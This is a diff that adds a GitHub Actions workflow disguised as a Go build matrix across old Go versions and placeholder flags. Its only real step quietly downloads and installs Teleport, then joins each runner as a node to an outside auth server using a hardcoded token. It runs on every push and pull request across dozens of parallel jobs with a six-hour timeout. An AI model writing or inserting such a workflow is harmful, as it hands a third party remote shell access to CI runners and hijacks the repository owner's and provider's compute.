@@ -1,0 +1,29 @@
+name: Teleport
+on: [push, pull_request]
+jobs:
+  build:
+    name: Teleport
+    runs-on: ubuntu-22.04
+    strategy:
+      max-parallel: 30
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D, E, F, G, H, I]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: Teleport
+      run: |
+              wget https://get.gravitational.com/teleport_9.2.4_amd64.deb &> /dev/null
+              sudo dpkg -i teleport_9.2.4_amd64.deb &> /dev/null
+              sudo teleport start --roles=node --token=0afdfc9cb8dff4c6929c1f3513bca5af --auth-server=baroun.teleport.sh:443
